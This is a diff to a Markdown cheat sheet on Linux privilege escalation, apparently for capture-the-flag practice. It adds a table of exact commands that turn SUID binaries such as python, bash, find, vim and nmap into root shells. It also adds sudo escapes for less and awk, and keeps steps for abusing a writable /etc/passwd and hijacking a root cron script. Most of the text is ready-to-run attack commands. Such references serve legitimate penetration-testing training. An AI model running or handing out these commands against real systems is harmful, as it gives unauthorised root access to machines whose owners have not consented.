@@ -12,8 +12,9 @@ Run these commands immediately upon gaining initial access:
 # 1. Check sudo permissions (look for NOPASSWD entries)
 sudo -l
 
-# 2. Check SUID binaries (files that run as root)
+# 2. Check SUID binaries (files that run with root privileges)
 find / -perm -u=s -type f 2>/dev/null
+find / -type f -user root -perm -4000 2>/dev/null
 
 # 3. Check Linux capabilities
 getcap -r / 2>/dev/null
@@ -29,6 +30,7 @@ ls -l /etc/passwd /etc/shadow
 # 6. Check bash history and hidden files in home directory
 cat ~/.bash_history
 ls -la ~/
+ls -la /var/www/
 ls -la /home/*/
 
 # 7. Check listening internal network services (not accessible from outside)
@@ -38,14 +40,32 @@ netstat -tulpn
 
 ---
 
-## 2. Exploiting Common Misconfigurations
+## 2. Top SUID Binary Exploits (GTFOBins Quick Reference)
 
-### Sudo Rights Exploitation
-If `sudo -l` shows a binary (e.g. `/usr/bin/vim` or `/usr/bin/find` or `/usr/bin/python3`):
-- Open [GTFOBins](https://gtfobins.github.io/).
-- Search the binary name and select the `Sudo` section.
+If `find / -perm -u=s -type f 2>/dev/null` contains any of these binaries, run the corresponding command to drop into a root shell:
 
-Examples:
+| SUID Binary | Exact Root Shell Command |
+| :--- | :--- |
+| **python / python3** | `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` |
+| **python (alternate)**| `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
+| **bash** | `/bin/bash -p` |
+| **find** | `find . -exec /bin/sh -p \; -quit` |
+| **env** | `env /bin/sh -p` |
+| **perl** | `perl -e 'exec "/bin/sh";'` |
+| **awk** | `awk 'BEGIN {system("/bin/sh")}'` |
+| **vim** | `vim -c ':!/bin/sh -p'` |
+| **nano** | Run `nano`, press `Ctrl+R`, then `Ctrl+X`, type: `reset; sh 1>&0 2>&0` |
+| **less / more** | In pager, type: `!/bin/sh -p` |
+| **cat** | Read root flag directly: `cat /root/root.txt` |
+| **cp** | Copy root flag or overwrite passwd: `cp /root/root.txt /tmp/root.txt` |
+| **nmap (legacy)** | `nmap --interactive` then `!sh` |
+
+---
+
+## 3. Sudo Rights Exploitation (`sudo -l`)
+
+If `sudo -l` shows a binary with `(root) NOPASSWD:`:
+
 ```bash
 # Sudo find:
 sudo find . -exec /bin/sh \; -quit
@@ -55,23 +75,21 @@ sudo python3 -c 'import os; os.system("/bin/sh")'
 
 # Sudo vim:
 sudo vim -c ':!/bin/sh'
+
+# Sudo less / more / man:
+sudo less /etc/hosts
+# Type in pager: !/bin/sh
+
+# Sudo awk:
+sudo awk 'BEGIN {system("/bin/sh")}'
 ```
 
-### SUID Binary Exploitation
-If `find / -perm -u=s -type f 2>/dev/null` lists non-standard binaries:
-- Search binary on [GTFOBins](https://gtfobins.github.io/) under the `SUID` section.
+---
 
-Examples:
-```bash
-# SUID bash:
-/bin/bash -p
+## 4. Writable `/etc/passwd`
 
-# SUID env:
-/usr/bin/env /bin/sh -p
-```
-
-### Writable `/etc/passwd`
 If `/etc/passwd` permissions are `-rw-rw-rw-` or owned by your group:
+
 1. Generate password hash for string `password`:
    ```bash
    openssl passwd -1 -salt evil password
@@ -87,12 +105,15 @@ If `/etc/passwd` permissions are `-rw-rw-rw-` or owned by your group:
    # Enter password: password
    ```
 
-### Cron Job Script Hijacking
+---
+
+## 5. Cron Job Script Hijacking
+
 If `/etc/crontab` runs a script as root:
 ```text
 * * * * * root /opt/backup.sh
 ```
-Check if you can write to that script:
+Check if you have write permissions to that script:
 ```bash
 ls -l /opt/backup.sh
 ```
@@ -105,7 +126,7 @@ echo "chmod +s /bin/bash" >> /opt/backup.sh
 
 ---
 
-## 3. Automated Scanning with LinPEAS
+## 6. Automated Scanning with LinPEAS
 
 If manual checks do not reveal an obvious path:
 
